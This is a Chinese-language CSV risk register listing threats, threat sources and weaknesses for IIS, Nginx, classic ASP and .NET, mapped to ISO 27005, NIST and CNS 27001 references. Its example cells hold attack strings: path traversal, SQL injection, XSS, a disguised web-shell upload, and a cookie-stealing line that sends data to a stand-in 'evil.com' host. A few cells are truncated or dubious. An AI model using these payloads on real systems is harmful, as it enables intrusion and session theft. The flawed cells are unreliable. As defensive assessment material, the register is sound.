資產類別,資產名稱,威脅,威脅說明,威脅 Reference,威脅源,威脅源說明,威脅源 Reference,弱點,弱點說明,弱點 Reference
軟體,應用程式伺服器 (IIS),7. 請求過濾規則不足 (Insufficient Request Filtering rules),IIS的請求過濾功能未被妥善設定，例如未限制URL長度、查詢字串長度、或未阻擋雙重編碼的惡意字元。,"ISO/IEC 27005, A.10, TI03",外部攻擊者,攻擊者利用雙重URL編碼 %252e%252e/ 來繞過簡單的目錄遍歷攻擊過濾規則。,"NIST SP 800-30, D-2",未啟用或強化IIS內建的安全功能,管理員僅依賴應用程式自身的安全性，未利用IIS提供的請求過濾、動態IP限制功能來建立縱深防禦。,"CNS 27001, A.8.9"
軟體,應用程式伺服器 (IIS),8. 不安全的加密演算法設定 (Insecure cipher suite configuration),Windows Server的Schannel (安全通道) 設定中，仍啟用已知的弱加密演算法或過時的協定版本，導致IIS的TLS連線不安全。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者可透過中間人攻擊，強制瀏覽器與伺服器降級使用不安全的加密協定，進而竊聽內容。,"NIST SP 800-30, D-2",未透過登錄檔或GPO強化Schannel設定,管理員未透過工具（如IIS Crypto）或手動修改登錄檔，來停用弱加密演算法並調整其優先順序。,"CNS 27001, A.8.24"
軟體,應用程式伺服器 (IIS),9. 未啟用IIS日誌 (IIS logging disabled),IIS的網站存取日誌功能被停用，或日誌欄位設定不完整，導致發生安全事件時，缺乏足夠的資訊進行調查。,"ISO/IEC 27005, A.10, TI03",內部人員 (意外),為了節省磁碟空間，管理員關閉了日誌記錄，或移除了來源IP、使用者代理重要欄位。,"NIST SP 800-30, G-4",缺乏日誌記錄政策與標準,沒有規範IIS的W3C日誌應記錄哪些欄位，以及日誌應保存多久、是否需集中收集。,"CNS 27001, A.8.15"
軟體,應用程式伺服器 (IIS),10. machineKey 設定不當 (Improper machineKey configuration),在Web Farm (負載平衡) 環境中，各IIS伺服器的 machineKey 未被設為相同的值，或使用了弱的演算法，導致加密的表單驗證Cookie或ViewState可被解密或偽造。,"ISO/IEC 27005, A.10, TI03",外部攻擊者,攻擊者在取得一個伺服器的 machineKey 後，可以偽造驗證Cookie，進而假冒任意使用者登入。,"NIST SP 800-30, D-2",部署程序未考慮叢集環境的安全性,在建立負載平衡環境時，管理員忽略了同步各節點之間 machineKey 的重要性。,"CNS 27001, A.8.26"
軟體,應用程式伺服器 (Nginx ),1. 設定檔錯誤導致路徑解析漏洞 (Path traversal due to misconfiguration),Nginx的 location 區塊設定不當，搭配 alias 指令使用時，可能產生目錄遍歷漏洞，讓攻擊者可存取到非預期的檔案。,"ISO/IEC 27005, A.10, TI03",內部人員 (意外),管理員設定 location /i/ { alias /data/w3/images/; }，攻擊者可透過 /i/../ 來存取 /data/w3/ 下的其他檔案。,"NIST SP 800-30, G-4",對Nginx設定檔語法理解不清,管理員不了解 root 與 alias 指令在路徑解析上的差異，因而產生安全漏洞。,"CNS 27001, A.8.9"
軟體,應用程式伺服器 (Nginx ),2. HTTP請求走私 (HTTP Request Smuggling),當Nginx作為前端反向代理，而後端是另一台Web伺服器時，若兩者對於HTTP請求的邊界解析方式不一致，攻擊者可發送一個模糊的請求，藉此走私第二個惡意請求給後端。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者利用 Content-Length 與 Transfer-Encoding: chunked 標頭的衝突，將一個請求隱藏在另一個請求的內文中。,"NIST SP 800-30, D-2",未對請求進行正規化處理,Nginx與後端伺服器對於不符合RFC標準的模糊HTTP請求，其處理方式存在差異。,"CNS 27001, A.8.28"
軟體,應用程式伺服器 (Nginx ),3. 未設定 try_files 導致原始碼洩漏 (Source code disclosure without try_files),Nginx在處理PHP請求時，若設定不當，攻擊者可透過特製的URL（如 .../file.jpg/x.php），讓Nginx將非PHP檔案（如圖片）交給PHP-FPM處理，可能導致原始碼洩漏或其他漏洞。,"ISO/IEC 27005, A.10, TH07",外部攻擊者,攻擊者利用此漏洞，讀取了包含資料庫連線字串的設定檔。,"NIST SP 800-30, D-2",PHP-FPM整合設定不安全,Nginx設定檔中，傳遞給PHP-FPM的腳本檔名可被使用者控制，且未檢查檔案是否存在。,"CNS 27001, A.8.9"
軟體,應用程式伺服器 (Nginx ),4. 緩存中毒 (Cache poisoning),當Nginx被用作快取伺服器時，若其快取鍵(Cache Key)的組成不夠嚴謹，攻擊者可提交一個惡意請求，讓Nginx將惡意內容快取起來，並提供給其他正常使用者。,"ISO/IEC 27005, A.10, TH09",外部攻擊者,攻擊者在HTTP標頭中注入XSS腳本，而該標頭未被納入快取鍵，導致惡意回應被快取。,"NIST SP 800-30, D-2",快取設定過於寬鬆,未仔細設定應根據哪些HTTP標頭來區分不同的快取物件。,"CNS 27001, A.8.28"
軟體,應用程式伺服器 (Nginx ),5. 伺服器版本資訊洩漏 (Server version banner disclosure),HTTP回應標頭或預設錯誤頁面中，顯示了Nginx的版本號，有助於攻擊者尋找特定版本的漏洞。,"ISO/IEC 27005, A.10, TH07",外部攻擊者,攻擊者使用掃描工具，收集網站使用的軟體版本，以便後續進行針對性攻擊。,"NIST SP 800-30, D-2",未啟用 server_tokens off,未在 nginx.conf 的 http 區塊中設定 server_tokens off; 來隱藏版本號。,"CNS 27001, A.8.9"
軟體,應用程式伺服器 (Nginx ),6. 日誌記錄不足或格式不當 (Insufficient or improper logging),Nginx的存取日誌未記錄必要的欄位（如POST請求的內文、上游回應時間），或使用非標準格式，導致難以整合至SIEM系統進行分析。,"ISO/IEC 27005, A.10, TI03",內部人員 (意外),管理員為了節省磁碟空間，使用了最精簡的日誌格式。,"NIST SP 800-30, G-4",缺乏日誌記錄政策與標準,沒有規範Nginx的日誌應記錄哪些欄位，以及日誌應保存多久、是否需集中收集。,"CNS 27001, A.8.15"
軟體,應用程式伺服器 (Nginx ),7. 不安全的加密演算法設定 (Insecure cipher suite configuration),Nginx的 ssl_ciphers 與 ssl_protocols 指令設定不當，仍支援已知的弱加密演算法或過時的協定版本。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者可透過中間人攻擊，強制瀏覽器與伺服器降級使用不安全的加密協定，進而竊聽內容。,"NIST SP 800-30, D-2",沿用預設或過時的加密設定,管理員未定期檢視並更新Nginx的TLS/SSL組態，以符合最新的安全最佳實踐。,"CNS 27001, A.8.24"
軟體,應用程式伺服器 (Nginx ),8. 未限制可用的HTTP方法 (Unrestricted HTTP methods),"Nginx預設允許 GET, HEAD, POST 以外的HTTP方法（如 DELETE, PUT, OPTIONS），若後端應用程式未正確處理，可能產生漏洞。","ISO/IEC 27005, A.10, TI03",外部攻擊者,攻擊者利用 OPTIONS 方法來探測伺服器支援哪些方法，或利用不安全的 DELETE 方法來刪除資源。,"NIST SP 800-30, D-2",未使用白名單方式限制HTTP方法,未在設定檔中使用 `if ($request_method !~ ^(GET,HEAD
軟體,應用程式伺服器 (Nginx ),9. 速率限制不足 (Insufficient rate limiting),未使用Nginx的 limit_req_zone 與 limit_conn_zone 模組，來限制單一IP的請求速率與並發連線數，導致容易受到DDoS或暴力破解攻擊。,"ISO/IEC 27005, A.10, TH11",外部攻擊者,攻擊者對網站的登入API發動高速的密碼猜測攻擊，因未受速率限制而可快速嘗試。,"NIST SP 800-30, D-2",未啟用或強化Nginx內建的安全功能,未充分利用Nginx作為反向代理的優勢，來對應用程式流量進行速率限制與存取控制。,"CNS 27001, A.8.2"
軟體,應用程式伺服器 (Nginx ),10. 動態模組漏洞 (Vulnerability in dynamic modules),"Nginx載入了第三方的動態模組（如Lua, Perl），而這些模組本身存在安全漏洞，可能導致Nginx被入侵。","NIST SP 800-30, D-2",供應商 / 外部攻擊者,使用的第三方WAF模組被發現存在可被繞過的漏洞。,"NIST SP 800-30, D-2",未對第三方模組進行安全評估,在導入第三方模組前，未調查其已知的安全紀錄、更新頻率與社群支援度。,"CNS 27001, A.5.21"
軟體,開發語言 (ASP),1. SQL注入式攻擊 (SQL Injection),傳統ASP程式碼經常使用字串串接的方式組合SQL查詢，極易產生SQL注入漏洞。,"ISO/IEC 27005, A.10, TH10",外部攻擊者,攻擊者在URL參數中注入SQL語法，如 product.asp?id=123; SHUTDOWN。,"NIST SP 800-30, D-2",使用過時的資料庫存取技術,仍在使用ADO (ActiveX Data Objects) 進行字串串接，而非使用能參數化查詢的ADO.NET。,"CNS 27001, A.8.28"
軟體,開發語言 (ASP),"2. 跨站腳本攻擊 (Cross-Site Scripting, XSS)","ASP程式碼直接使用 Response.Write(Request.QueryString(""name"")) 方式將使用者輸入輸出到頁面，若未經HTML編碼，將導致XSS。","NIST SP 800-30, H-4",外部攻擊者,攻擊者在輸入欄位中填入 <script>alert(document.cookie)</script>。,"NIST SP 800-30, D-2",未對使用者輸出進行編碼,開發者未使用 Server.HTMLEncode() 函式來對所有要顯示在網頁上的使用者輸入進行編碼。,"CNS 27001, A.8.28"
軟體,開發語言 (ASP),3. 檔案上傳漏洞 (File upload vulnerabilities),用於處理檔案上傳的ASP元件（如 ADODB.Stream）若未嚴格驗證檔案類型與內容，可能允許攻擊者上傳Web Shell。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者上傳一個名為 shell.asp.jpg 的檔案，繞過簡單的副檔名檢查後，在伺服器上被當作ASP腳本執行。,"NIST SP 800-30, D-2",未驗證檔案的真實類型,程式碼僅檢查了副檔名，而未檢查檔案的MIME類型，也未將上傳目錄的執行權限移除。,"CNS 27001, A.8.28"
軟體,開發語言 (ASP),4. 包含漏洞 (Inclusion vulnerabilities),使用 `` 伺服器端包含(SSI)指令時，若檔案路徑部分來自使用者輸入，可能導致本地檔案包含(LFI)漏洞。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者在URL輸入 ?page=../../boot.ini 來嘗試讀取系統開機設定檔。,"NIST SP 800-30, D-2",未對檔案包含的路徑建立白名單,程式允許動態地包含檔案，但未限制可被包含的檔案只能來自一個安全的、預先定義好的目錄。,"CNS 27001, A.8.28"
軟體,開發語言 (ASP),5. 錯誤處理不當 (Improper error handling),ASP腳本發生錯誤時，IIS預設會顯示詳細的錯誤訊息，包含錯誤行號與原始碼片段，洩漏過多內部資訊。,"ISO/IEC 27005, A.10, TH07",外部攻擊者,攻擊者從錯誤訊息中得知了資料庫連線字串的變數名稱與程式實體路徑。,"NIST SP 800-30, D-2",未在程式碼開頭設定 `On Error Resume Next`,未使用適當的錯誤處理機制來捕捉錯誤，並導向統一的、對使用者友善的錯誤頁面。,"CNS 27001, A.8.28"
軟體,開發語言 (ASP),6. COM 元件漏洞 (COM component vulnerabilities),ASP程式透過 `Server.CreateObject()` 呼叫的COM元件本身存在漏洞（如緩衝區溢位），可能被攻擊者利用來執行任意程式碼。,"NIST SP 800-30, H-4",外部攻擊者,某個用於處理圖片上傳的第三方COM元件被發現有緩衝區溢位漏洞，攻擊者可上傳特製的圖片來觸發。,"NIST SP 800-30, D-2",使用過時或不再維護的第三方元件,系統仍在使用多年前購買或下載的COM元件，而該元件已不再有安全更新。,"CNS 27001, A.8.29"
軟體,開發語言 (ASP),7. Session 管理不安全 (Insecure session management),ASP產生的Session ID可被預測性較高，或未設定 `HttpOnly` 旗標，容易被XSS攻擊竊取。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者透過XSS，執行 `document.location='https://www.google.com/search?q=http://evil.com/steal.php%3Fc%3D%27%2Bdocument.cookie` 來竊取Session ID。,"NIST SP 800-30, D-2",未使用安全的Session管理機制,未在IIS層級或程式碼中強制為Session Cookie加上 `HttpOnly` 與 `Secure` 旗標。,"CNS 27001, A.8.26"
軟體,開發語言 (ASP),8. 存取控制實作不當 (Broken access control implementation),程式在每個頁面的開頭，僅檢查使用者是否登入，但未檢查該使用者是否有權限存取該頁面的功能。,"NIST SP 800-30, H-4",內部使用者,一般使用者在登入後，直接在瀏覽器網址列輸入管理員頁面的URL（如 `admin.asp`），成功進入後台。,"NIST SP 800-30, D-2",認證與授權邏輯混淆,開發者認為只要使用者是合法的（已登入），就可以存取所有功能，未實作基於角色的存取控制。,"CNS 27001, A.8.3"
軟體,開發語言 (ASP),9. 依賴過時的作業系統元件 (Dependency on outdated OS components),傳統ASP高度依賴IIS 6.0或更早版本，以及Windows Server 2003已停止支援的作業系統，無法遷移至較安全的平台。,"ISO/IEC 27005, A.10, TO01",結構性因素,應用程式使用了僅存在於舊版作業系統中的特定COM元件，導致無法升級。,"NIST SP 800-30, D-2",缺乏技術債管理與系統現代化計畫,未投入資源將舊有的ASP應用程式重構為現代化的語言（如.NET），導致被綁死在不安全的平台上。,"CNS 27001, A.8.8"
軟體,開發語言 (ASP),10. 缺乏開發人員與社群支援 (Lack of developer and community support),由於ASP技術已過時，遇到問題時難以找到具備相關技能的開發人員進行維護，也缺乏活躍的社群來提供安全建議與解決方案。,"ISO/IEC 27005, A.10, TO01",結構性因素,公司內唯一懂ASP的工程師離職後，系統發生問題便無人能修復。,"NIST SP 800-30, D-2",人力資源與技能規劃不足,未能預見技術過時帶來的人力斷層風險，並預先進行人員培訓或系統重構。,"CNS 27001, A.6.3"
軟體,開發語言 (.NET),1. 不安全的反序列化 (Insecure Deserialization),".NET應用程式在處理來自使用者的序列化資料時（如XML, JSON），若使用不安全的格式化器(Formatter)，可能觸發遠端程式碼執行。","NIST SP 800-30, H-4",外部攻擊者,攻擊者精心建構一個惡意的序列化物件(Gadget chain)，並將其作為ViewState的一部分傳送給ASP.NET應用程式處理。,"NIST SP 800-30, D-2",使用存在已知反序列化漏洞的函式庫或類別,專案中使用了 `BinaryFormatter` 或舊版的 `Json.NET` 來反序列化不受信任的資料。,"CNS 27001, A.8.29"
軟體,開發語言 (.NET),2. ViewState 未受保護 (Unprotected ViewState),ASP.NET的ViewState若未啟用加密與MAC(訊息鑑別碼)保護，其內容可被使用者輕易解碼、竄改，甚至可能觸發反序列化漏洞。,"NIST SP 800-30, H-4",外部攻擊者,攻擊者使用工具解碼ViewState，修改其中的價格資訊後再送回伺服器，以低價購買商品。,"NIST SP 800-30, D-2",頁面或網站層級未啟用ViewState保護,網頁的 `EnableViewStateMac` 屬性被設為 `false`，或 `machineKey` 設定不安全。,"CNS 27001, A.8.26"
軟體,開發語言 (.NET),3. SQL注入式攻擊 (SQL Injection),雖然ADO.NET提供參數化查詢，但開發者若仍使用字串串接的方式組合SQL，或不當使用預存程序，依然會產生SQL注入漏洞。,"ISO/IEC 27005, A.10, TH10",外部攻擊者,攻擊者在輸入欄位注入惡意SQL語法，透過ORM（如Entity Framework）的不當使用而成功執行。,"NIST SP 800-30, D-2",未遵循安全編碼實踐,開發人員未使用ADO.NET的 `SqlCommand.Parameters` 集合，或使用 `ExecuteSqlCommand` 執行拼接的SQL字串。,"CNS 27001, A.8.28"
軟體,開發語言 (.NET),"4. 跨站腳本攻擊 (Cross-Site Scripting, XSS)",ASP.NET雖然預設會對請求進行驗證，但若開發者為了特定功能而關閉請求驗證，又未手動進行HTML編碼，將導致XSS。,"NIST SP 800-30, H-4",外部攻擊者,開發者為了一個富文本編輯器而關閉請求驗證，但未對從資料庫讀取並顯示的內容進行編碼。,"NIST SP 800-30, D-2",未對使用者輸出進行編碼,開發者未使用 `HttpUtility.HtmlEncode` 或Razor語法中的 `@` 來對輸出進行編碼。,"CNS 27001, A.8.28"
